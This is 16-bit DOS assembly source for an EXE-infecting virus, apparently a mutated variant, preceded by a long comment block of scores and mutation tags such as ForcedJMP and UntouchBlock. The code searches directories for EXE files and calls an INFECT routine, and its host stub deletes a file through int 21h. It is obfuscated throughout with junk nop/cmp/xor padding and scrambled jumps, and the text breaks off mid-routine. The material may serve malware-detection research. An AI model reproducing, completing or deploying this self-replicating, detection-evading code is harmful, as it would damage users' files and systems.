;1.16158087529
;		JNZ 	_0
;1.35566812662
;1.19671280102
;0.990806527953
;1.63650664075
;UntouchBlock_0
;1.16131555518
;1.20514996381
;		JZ 	_0
;0.935233318033
;1.11027241731
;0.989890554234
;1.4278963479
;2.12579873694
;UntouchBlock_1
;1.05141393339
;ForcedJMP_0
;1.27202367411
;1.62487425266
;1.38776552542
;1.20456917107
;1.04112032677
;0.969643558691
;1.24742760508
;1.10202567241
;ForcedJMP_1
;1.0988172228
;		JZ 	_0
;0.865710600505
;1.54538118463
;0.783634540288
;		JZ 	_0
;1.11801638906
;		JZ 	_0
;0.968879831638
;1.14124567636
;UntouchBlock_1
;1.05406147495
;UntouchBlock_0
;1.35791974225
;1.04090456347
;0.992962895405
;0.913360211101
;1.01758343585
;1.31923165735
;1.01496540015
;NoMutation
;1.38136317556
;1.01265654443
;NoMutation
;0.683197211744
;1.07764790444
;ForcedJMP_0
;0.934539701984
;0.75264416515
;0.984308737028
;1.38385850119
;1.67670773496
;		JZ 	_0
;1.26678221954
;1.35434095293
;NoMutation
;0.909298198541
;ForcedJMP_1
;0.78485432957
;		JNZ 	_0
;0.961791710667
;0.829075426372
;1.28243664333
;		JZ 	_0
;1.50816153825
;ForcedJMP_1
;1.17733078886
;0.901954963455
;0.920134552082
;0.885978312478
;NoMutation
;0.997785984298
;1.13284805189
;		JZ 	_0
;0.782029762286
;0.658307797829
;0.776756628294
;1.34957780302
;1.30228095277
;0.856400534234
;1.07762660671
;1.18746480442
;ForcedJMP_1
;0.851986623954
;0.792027263951
;1.15200852473
;NoMutation
;0.87262548005
;1.09812111754
;UntouchBlock_1
;0.9255529292
;0.938247640326
;0.809995884323
;1.09809171694
;1.09360799723
;0.651893033839
;0.824508842057
;0.996626897459
;1.00145932195
;0.884744475324
;1.26217156002
;1.29491759175
;1.02916569549
;1.25590034972
;UntouchBlock_1
;0.846298325239
;0.700353316216
;0.602074741795
;1.41783856544
;0.773434471678
;0.860527006444
;1.03392872623
;		JZ 	_1
;0.803457260523
;1.15670250846
;0.958493392215
;1.12193583503
;0.869424608289
;0.893052681214
;1.1129896776
;0.776326631323
;0.675363894348
;0.936506891996
;UntouchBlock_0
;1.11848163777
;0.802430570281
;0.894673049208
;0.828134514187
;0.860895494318
;		JZ 	_0
;0.8302570346
;NoMutation
;0.731622431696
;1.20578343798
;		JNZ 	_0
;1.07914420987
;0.948103119102
;0.904446522644
;1.01234956242
;1.29296232206
;		JNZ 	_0
;0.92034587693
;NoMutation
;1.19224688882
;ForcedJMP_1
;0.785161203354
;0.988368553753
;ForcedJMP_0
;1.08147916582
;ForcedJMP_1
;0.815261971856
;1.26161491996
;UntouchBlock_0
;0.756294891237
;0.726905681966
;0.914872288379
;1.14223901703
;0.753072697015
;1.09014617998
;0.878635884124
;		JNZ 	_0
;0.810334253762
;UntouchBlock_0
;0.821813340509
;0.908488106029
;UntouchBlock_1
;0.897027227606
;ForcedJMP_1
;1.14845271121
;		JZ 	_1
;0.898260790846
;0.595287873977
;0.997849328192
;0.864337280042
;UntouchBlock_0
;0.860924170523
;0.661013553777
;0.714248335864
;0.905806997124
;0.550519256058
;0.872036054015
;0.936548762694
;UntouchBlock_0
;0.85707815856
;ForcedJMP_0
;0.814962744891
;		JZ 	_0
;0.837890924552
;		JNZ 	_1
;0.659852590672
;1.11322003165
;UntouchBlock_0
;0.765603313696
;UntouchBlock_0
;0.835840102351
;1.24004923655
;ForcedJMP_0
;0.879492499525
;0.757850788179
;0.691913698421
;1.09603688378
;UntouchBlock_1
;0.984663107865
;0.70798583304
;0.766392544398
;1.02168238027
;0.695128352031
;0.858715717483
;0.754626783022
;0.705602155521
;1.16055040338
;		JZ 	_0
;0.978511653203
;		JNZ 	_1
;0.885684454678
;0.60427273131
;		JZ 	_0
;0.596864954937
;NoMutation
;0.58337909074
;0.629512355399
;1.09697986467
;		JZ 	_1
;0.719346530532
;0.655694682851
;0.794099373228
;0.705992226253
;0.921948106328
;0.768670853792
;		JNZ 	_0
;1.16734793028
;UntouchBlock_1
;0.781662894231
;0.691428436158
;UntouchBlock_1
;0.986548637694
;0.553048192712
;0.796195401678
;		JZ 	_1
;0.949850840061
;0.973125954277
;UntouchBlock_0
;0.481218911036
;0.474425981584
;0.673925580013
;0.748624265488
;		JNZ 	_1
;1.02683704497
;0.849451068734
;NoMutation
;0.521230713727
;0.705793019854
;0.923499301785
;0.877790091504
;0.987615647032
;0.59349617264
;0.682740028097
;0.773074067733
;0.577154049377
;1.11685595824
;ForcedJMP_0
;0.971571179979
;UntouchBlock_0
;0.921411663756
;		JZ 	_0
;0.634415014999
;0.724716359955
;0.696344156381
;0.657667297358
;0.707615210218
;0.819366357123
;0.649991732675
;0.893468636184
;0.650385919299
;UntouchBlock_0
;0.729899740768
;0.706663883828
;0.861703279587
;0.630479144547
;0.830376174992
;0.880464371307
;0.640400340103
;0.588704495594
;UntouchBlock_0
;0.624771177618
;0.750361415652
;1.05021131778
;0.673219371838
;0.454585316216
;ForcedJMP_1
;0.836966157413
;ForcedJMP_0
;0.547120861381
;0.65034232861
;0.591651921503
;0.78584415467
;0.901183254056
;0.623190296192
;0.489878334593
;ForcedJMP_1
;0.548224255205
;ForcedJMP_0
;0.597069766181
;0.847823809636
;0.60624696883
;0.708330441864
;0.502987458703
;0.715676133583
;ForcedJMP_0
;0.613436546003
;0.574987062968
;UntouchBlock_0
;0.541342654042
;NoMutation
;0.618787718641
;0.521866158992
;0.621265574235
;UntouchBlock_0
;0.677493619613
;0.410442786085
;0.664779416848
;		JZ 	_1
;0.482377790182
;0.75867268045
;0.723110892542
;0.429819801085
;ForcedJMP_0
;0.686566914275
;0.531019675085
;0.628308837267
;0.484615301666
;0.322305245336
;0.546727888598
;0.561680349059
;UntouchBlock_1
;0.56420857326
;0.618564912626
;		JNZ 	_0
;0.533267978092
;UntouchBlock_1
;0.495080895456
;		JZ 	_1
;0.579976618854
;0.55958912677
;0.655205249427
;		JZ 	_0
;0.554421962982
;0.429888700427
;0.424578666126
;0.437384847761
;UntouchBlock_0
;0.473900158297
;		JZ 	_0
;0.623968325035
;		JZ 	_1
;0.450732307557
;0.336268761426
;0.466199298325
;0.371150015055
;		JNZ 	_0
;0.396798047752
;ForcedJMP_0
;0.309260363802
;0.458650437131
;ForcedJMP_0
;0.403719675959
;0.450366911225
;NoMutation
;0.348654027021
;		JZ 	_0
;0.258775100619
;0.311260535806
;0.293532701414
;0.296834419218
;NoMutation
;0.369636266161
;		JZ 	_0
;0.330092839458
;0.299755704199
;		JZ 	_0
;0.440367065765
;ForcedJMP_1
;0.314463961797
;0.328983439393
;0.332699504127
;		JNZ 	_0
;0.396371738252
;UntouchBlock_1
;0.447593437142
;0.266849395746
;0.296199200676
;		JNZ 	_0
;0.277253827592
;0.276777322674
;0.27364277852
;ForcedJMP_0
;0.256860844899
;ForcedJMP_0
;0.173648057376
;0.238537014467
;ForcedJMP_1
;0.143385933532
;ForcedJMP_0
;0.16442867103
;0.184312356873
;0.149536332004
;UntouchBlock_1
;0.153120530164
;0.164568874615
;0.122436643556
;NoMutation
;0.125972632691
;0.0946017695604
;0.122131664167
;0.116308482939
;UntouchBlock_1
;		JZ 	_0
;		JNZ 	_1
;ForcedJMP_0
 		.SEQ ;segments must appear in sequential order
HOSTSEG SEGMENT BYTE
 		ASSUME CS:HOSTSEG,SS:HSTACK
PGMSTR DB ’ABC.EXE’,0
HOST:
		JMP 	HFSQM
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
HFSQM:
		JMP 	WUMMO
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
WUMMO:
	 mov ax,cs 
BCSML:
AHVOU:
NYIRD:
	 mov ds,ax
CRSYU:
UNXEU:
		JMP 	FLXBA
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
FLXBA:
		JMP 	UPHPI
nop
nop
nop
nop
nop
nop
nop
UPHPI:
		JMP 	GEHAN
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
GEHAN:
	 mov dx,OFFSET PGMSTR
XHYOT:
UKMU_:
AODY_:
	 mov ah,41H
BPI_E:
JCHLC:
LGALZ:
	 int 21H 
		JMP 	ZTHJQ
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
ZTHJQ:
	 mov ah,4CH
LIJWL:
FNXKK:
NTIDE:
		JMP 	HNSEX
nop
nop
nop
nop
nop
nop
nop
nop
nop
HNSEX:
	 mov al,0
TKOWV:
AZ_ZX:
CRDCO:
R_TPF:
BFLSV:
IOLET:
CYALZ:
	 int 21H 
HOSTSEG ENDS
HSTACK SEGMENT PARA STACK
db 100H dup (?)
HSTACK ENDS
STACKSIZE EQU 100H 
NUMRELS EQU 2 
VSEG SEGMENT PARA
 	 ASSUME CS:VSEG,DS:VSEG,SS:VSTACK
VIRUSID 	DW 0C8AAH 
OLDDTA 		DD 0 
DTA1 		DB 2BH dup (?) 
DTA2		DB 56H dup (?) 
EXE_HDR 	DB 1CH dup (?) 
EXEFILE 	DB ’\*.EXE’,0 
ALLFILE 	DB ’\*.*’,0 
USEFILE 	DB 78 dup (?) 
LEVEL 		DB 0 
HANDLE 		DW 0 
FATTR 		DB 0 
FTIME 		DW 0 
FDATE 		DW 0 
FSIZE 		DD 0 
VIDC 		DW 0 
VCODE 		DB 1 


VIRUS:
		 push ax
		JMP 	QQHBD
nop
nop
nop
nop
nop
nop
nop
nop
nop
QQHBD:
		JMP 	XKGO_
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
XKGO_:
		JMP 	ZPIRP
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
ZPIRP:
		JMP 	VGAGC
nop
nop
nop
nop
VGAGC:
		 mov ax,cs
QYCSJ:
WOWVI:
XUYCS:
		JMP 	HLGDF
HXMWY:
		JMP 	ZMCXD
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
ZMCXD:
		JMP 	VZPMR
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
VZPMR:
		JMP 	IZQJ_
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
IZQJ_:
		 mov ds,ax 						
SKRPE:
LDMUR:
		JMP 	MLXXI
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
MLXXI:
		 mov ax,es 						
HIPXN:
UQKOH:
DG_FK:
JNZ FVDQS
JMP HMHO_
FVDQS:
		JMP 	JVHMG
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
JVHMG:
		JMP 	LUOWF
cmp ax,bx
cmp ax,bx
LUOWF:
		 mov WORD PTR [OLDDTA+2],ax 	
VCFRY:
BPUNV:
ELZUP:
		JMP 	ZDNIM
VWXCB:
		JMP 	SDSLV
VPKNX:
		 call SHOULDRUN 				
		 jz   N1
		 JMP  REL1
		 N1: 						
		 call SETSR 
		 call NEW_DTA 					
		 call FIND_FILE 				
		 jz   N2
		 JMP  FINISH 					
		 N2:
		 call SAVE_ATTRIBUTE 			
		 call INFECT 					
		 call REST_ATTRIBUTE 			
HLGDF:
		call 	 HXMWY
SDSLV:
		call 	 VPKNX
ZDNIM:
		call 	 VWXCB


FINISH:  call RESTORE_DTA 	
QXV_G:
		call 	 YJUZO
HMHO_:
		call 	 FVDQS
YCOQB:
		call 	 TCKWC
QYYPO:
		call 	 CZUG_
 		 pop ax

REL1: 						
		JMP 	SMALW
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
SMALW:
		JMP 	WIVEX
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
WIVEX:
 		 mov ax,HSTACK 				
ITEHN:
FLLSP:
XOTEP:
JNZ TCKWC
JMP YCOQB
TCKWC:
 		 cli 
FVGPM:
		call 	 IUQAX
DZGJF:
		call 	 SNOYV
		JMP 	XOWWL
nop
nop
nop
nop
nop
nop
XOWWL:
 		 mov ss,ax
JNZ PEMGK
JMP ALNZN
PEMGK:
JNZ RQAJW
JMP FYPUG
RQAJW:
		JMP 	BQXZT
TFJD_:
JZ CZUG_
JMP QYYPO
CZUG_:
JZ ZAQKM
JMP OSAHN
ZAQKM:
JNZ HYH_L
JMP LWKCV
OSAHN:
		call 	 ZAQKM
BQXZT:
		call 	 TFJD_
FYPUG:
		call 	 RQAJW
ALNZN:
		call 	 PEMGK
QVRKR:
		call 	 ESKQF
HYH_L:

REL1A: 						
 		 mov sp,OFFSET HSTACK
JZ JOWVZ
JMP QAXRW
JOWVZ:
 		 mov es,WORD PTR [OLDDTA+2] 
		JMP 	QVRKR
ESKQF:
		JMP 	DZGJF
SNOYV:
		JMP 	FVGPM
IUQAX:
		JMP 	AEXDN
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
AEXDN:
		 mov ds,WORD PTR [OLDDTA+2] 
		cmp 	ax,cx
JNZ BMRRE
JMP VXRCJ
BMRRE:
		JMP 	LXQOW
USSPR:
		cmp 	cx,ax
JNZ ZDINA
JMP NDLAV
ZDINA:
LWKCV:
		call 	 HYH_L
QAXRW:
		call 	 JOWVZ
NDLAV:
		call 	 ZDINA
VXRCJ:
		call 	 BMRRE
 		 sti 					

REL2:					 			
AIT__:
		call 	 _AGDF
 		jmp FAR PTR HOST 
SLBQA:
JTYBO:
		call 	 BDQGQ
EBARB:
		call 	 AUQZY
LXQOW:
		call 	 USSPR
		call 	 KGKQR


FIND_FILE:
		JMP 	FMBCS
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
FMBCS:
		JMP 	PKVCF
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
PKVCF:
	mov al,’\’ 
		JMP 	EBARB
AUQZY:
JNZ BDQGQ
JMP JTYBO
BDQGQ:
		JMP 	QXV_G
YJUZO:
		JMP 	IP_NL
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
IP_NL:
		JMP 	IYA_K
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
IYA_K:
		JMP 	_NZSQ
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
_NZSQ:
		JMP 	NZKQO
nop
nop
nop
nop
nop
nop
nop
NZKQO:
	mov BYTE PTR [USEFILE],al
VKLIY:
ONZGU:
RQPOB:
FIRNT:
JZ _AGDF
JMP AIT__
_AGDF:
		JMP 	SLNHK
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
SLNHK:
	mov si,OFFSET USEFILE+1
WHUEL:
HFUTW:
TKRVO:
CXK_X:
CLLZK:
	xor dl,dl
	mov ah,47H
UBQMV:
DCUEV:
HNVP_:
JZ DKPMT
JMP DUKN_
DKPMT:
JNZ KGKQR
JMP SLBQA
KGKQR:
		JMP 	PQVQY
CHXIE:
	int 21H 
	cmp BYTE PTR [USEFILE+1],0 
	jz  N3
	JMP FF2 
	N3:
	xor al,al 
PQVQY:
		call 	 CHXIE
		JMP 	RQUMI
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
RQUMI:
		JMP 	DBUOU
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
DBUOU:
		JMP 	CO_LW
nop
CO_LW:
	mov BYTE PTR [USEFILE],al 
WGFHB:
JZ ETTTQ
JMP XPIGM
XPIGM:
		call 	 ETTTQ
DUKN_:
		call 	 DKPMT
ZTITC:
		call 	 _SU_R
ON_LB:
		call 	 DPBME
NWSAY:
		call 	 QWDMC
A_A_M:
		call 	 IBQYJ
YSFUN:
		call 	 DD_ID
KSQGV:
		call 	 AIETB
AQEST:
		call 	 JSIKL
UVOGI:
		call 	 MAHAH
YGOGW:
		call 	 YZESQ
WASPI:
		call 	 ALBDX
DTWBR:
		call 	 WDJZW
ETTTQ:

FF2: mov al,2
JZ WDJZW
JMP DTWBR
WDJZW:
JNZ YZESQ
JMP YGOGW
YZESQ:
JNZ DPBME
JMP ON_LB
DPBME:
		JMP 	ZTITC
_SU_R:
		JMP 	LNYMY
xor bx,cx
LNYMY:
		JMP 	QUEIH
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
QUEIH:
	mov [LEVEL],al 
QGTQL:
JZ ALBDX
JMP WASPI
ALBDX:
JNZ MAHAH
JMP UVOGI
MAHAH:
JNZ JSIKL
JMP AQEST
JSIKL:
		JMP 	KSQGV
AIETB:
		JMP 	YSFUN
DD_ID:
JZ IBQYJ
JMP A_A_M
IBQYJ:
	call FINDBR 
	jnz N4
	JMP FF3 
	N4:
	xor al,al 
		JMP 	FIREQ
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
FIREQ:
		JMP 	EGDWW
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
EGDWW:
	mov BYTE PTR [USEFILE],al 
AUQFC:
YWDSQ:
		JMP 	NWSAY
QWDMC:
		JMP 	X_JM_
JCCKT:
		JMP 	IEIQY
AYESZ:
JZ FPMRX
JMP HMMHY
FPMRX:
	inc al 
		JMP 	YRHZT
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
YRHZT:
		JMP 	EYHRT
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
EYHRT:
	mov [LEVEL],al 
		JMP 	VY_XN
JRYGC:
IEIQY:
		call 	 AYESZ
AJPHW:
		call 	 SD_FS
X_JM_:
		call 	 JCCKT
VY_XN:
		call 	 JRYGC
	call FINDBR 

FF3:
HMMHY:
		call 	 FPMRX
BFHHH:
		call 	 NKPAW
MXRAH:
		call 	 WQC_N
NZAZD:
		call 	 OUKTY
	ret 

FINDBR:
	call FINDEXE 
	jc  N5
	JMP FBE3 
	N5:
	cmp [LEVEL],0 
	jnz N6
	JMP FBE1 
	N6:
	dec [LEVEL] 
		JMP 	QENLP
nop
nop
nop
nop
nop
QENLP:
		JMP 	MAZLT
cmp cx,dx
MAZLT:
		JMP 	DNDTE
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
DNDTE:
		JMP 	QIWHV
nop
nop
nop
nop
nop
QIWHV:
	mov di,OFFSET USEFILE 
JNZ OUKTY
JMP NZAZD
OUKTY:
JNZ SD_FS
JMP AJPHW
SD_FS:
		JMP 	MXRAH
WQC_N:
		JMP 	PPNTM
OQOJN:
	mov si,OFFSET ALLFILE 
ZRPTK:
RMGUD:
JNZ CRLSQ
JMP DIVDX
CRLSQ:
JZ NKPAW
JMP BFHHH
NKPAW:
	call CONCAT 
	inc di
	push di 
	call FIRSTDIR 
	jz  N7
	JMP FBE 
PPNTM:
		call 	 OQOJN
BRDOT:
		call 	 _ASNM
PVR_Z:
		call 	 DKUJK
DIVDX:
		call 	 CRLSQ
	N7:

FB1: 
		pop di 
		xor al,al
		stosb
		JMP 	HIXHB
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
HIXHB:
		JMP 	RPVRN
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
RPVRN:
		JMP 	ENAKA
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
ENAKA:
		mov di,OFFSET USEFILE
MCOZH:
_KQEA:
QPMEV:
MDYHR:
GQJUL:
JNZ DKUJK
JMP PVR_Z
DKUJK:
JNZ _ASNM
JMP BRDOT
_ASNM:
		JMP 	XFNBL
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
XFNBL:
		JMP 	FWQHW
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
FWQHW:
		mov bx,OFFSET DTA2+1EH
ZUXSY:
CTBCL:
CTQGV:
		JMP 	DTGQU
DSKMY:
		mov al,[LEVEL]
UJ_WE:
UHEMM:
OQFXL:
YRPTS:
JNZ XPLOJ
JMP FGXLB
XPLOJ:
		JMP 	EATVK
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
EATVK:
		mov dl,2BH 
YOIFY:
KXRFQ:
TYYKR:
		mul dl 
		add bx,ax 
		JMP 	NBPRT
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
NBPRT:
		JMP 	QQERS
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
QQERS:
		JMP 	PZKTM
nop
nop
nop
nop
nop
nop
nop
nop
nop
PZKTM:
		mov si,bx
FANTX:
JNZ IONLD
JMP HQLMA
IONLD:
		JMP 	NPAWE
_AQGO:
		call CONCAT 
		push di 
		call FINDBR 
		jnz N8
		JMP FBE2 
		N8:
		call NEXTDIR 
		jnz N9
		JMP FB1 
WYJTO:
		call 	 YCQTK
DTGQU:
		call 	 DSKMY
FGXLB:
		call 	 XPLOJ
HQLMA:
		call 	 IONLD
		N9:

FBE: 
		inc [LEVEL] 
		pop di 
		xor al,al 
NPAWE:
		call 	 _AQGO
		stosb

		JMP 	WLCNA
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
WLCNA:
FBE1: mov al,1 
		cmp 	dx,dx
JNZ SDQNF
JMP IODRZ
SDQNF:
JNZ YFXSB
JMP NF_DJ
YFXSB:
		JMP 	EFOEM
ACWA_:
JNZ EVVHO
JMP IBNEP
EVVHO:
	or al,al
IBNEP:
		call 	 EVVHO
NF_DJ:
		call 	 YFXSB
	ret

NECZS:
		call 	 UJMCT
YZPDW:
		call 	 XYKLW
IODRZ:
		call 	 SDQNF
FBE2: pop di 

FBE3: xor al,al 
MXTS_:
		call 	 PIHMO
EBLMG:
		call 	 DWVWT
EFOEM:
		call 	 ACWA_
MVGMI:
		call 	 RVDJV
 	  ret 
MXWDG:
A_QYR:
		call 	 ZBWIQ
		call 	 T_DRZ


FINDEXE:
		JMP 	YYHEK
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
YYHEK:
		mov dx,OFFSET DTA1 
JZ ZBWIQ
JMP A_QYR
ZBWIQ:
JNZ T_DRZ
JMP MXWDG
T_DRZ:
		JMP 	YZPDW
XYKLW:
		mov ah,1AH
		JMP 	MVGMI
RVDJV:
JNZ DWVWT
JMP EBLMG
DWVWT:
JNZ YCQTK
JMP WYJTO
YCQTK:
		int 21H
		JMP 	MRBEM
nop
nop
nop
nop
MRBEM:
		mov di,OFFSET USEFILE
YEBAN:
IZJIB:
QXTJQ:
BVUAU:
JNZ UJMCT
JMP NECZS
UJMCT:
		mov si,OFFSET EXEFILE
L_DYT:
		call CONCAT 
		push di 
		JMP 	OTWCY
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
OTWCY:
		mov dx,OFFSET USEFILE
OVXE_:
KSWKX:
SMVPH:
NNEUN:
JZ R_PHI
JMP PZS_H
R_PHI:
		JMP 	_SHRO
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
_SHRO:
		JMP 	PGBNA
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
PGBNA:
		JMP 	MGUJD
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
MGUJD:
		JMP 	OC_NS
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
OC_NS:
		mov cx,3FH 
CIIVX:
IHNTU:
		JMP 	IRMJZ
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
IRMJZ:
		mov ah,4EH
MTHR_:
ETQMW:
JZ EVFWQ
JMP GHEUL
EVFWQ:
JNZ HWBKQ
JMP CBJEX
HWBKQ:
JZ BKOJT
JMP LTBQU
BKOJT:
JNZ PIHMO
JMP MXTS_
PIHMO:
PZS_H:
		call 	 R_PHI
LMPOQ:
		call 	 CMRZV
LTBQU:
		call 	 BKOJT
CBJEX:
		call 	 HWBKQ
GHEUL:
		call 	 EVFWQ
UKNGO:
		call 	 BYMII
YMBWM:
		call 	 CEJOV
		int 21H

NEXTEXE:
		or al,al 
		jz N10
		JMP FEC 
		N10:
		pop di
		inc di
		stosb 
		JMP 	ZREIH
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
ZREIH:
		mov di,OFFSET USEFILE
		mov si,OFFSET DTA1+1EH
JZ CEJOV
JMP YMBWM
CEJOV:
JZ BYMII
JMP UKNGO
BYMII:
JZ CMRZV
JMP LMPOQ
CMRZV:
		call CONCAT 
		dec di
		push di
		call FILE_OK 
		jc N11
		JMP FENC 
		N11:
		JMP 	CLAGO
nop
nop
nop
nop
CLAGO:
		mov ah,4FH
GHQSE:
GEHWA:
IJWEN:
FHHYQ:
XOHEW:
WZZZE:
JZ TJEDF
JMP BRYGJ
TJEDF:
JZ XCVSV
JMP VXAED
XCVSV:
JZ GBIDA
JMP SSNMG
GBIDA:
JNZ IJAVS
JMP QBO_J
IJAVS:
		int 21H 
BLCTV:
		call 	 KD_SH
FCAPV:
		call 	 HLCKH
VXAED:
		call 	 XCVSV
UIHCF:
		call 	 KHMBG
BRYGJ:
		call 	 TJEDF
UJMBS:
		call 	 RGDER
QJSAZ:
		call 	 XXOMU
		jmp SHORT NEXTEXE 

FEC: 
	 pop di
		JMP 	OLKXS
cmp ax,bx
cmp ax,bx
cmp ax,bx
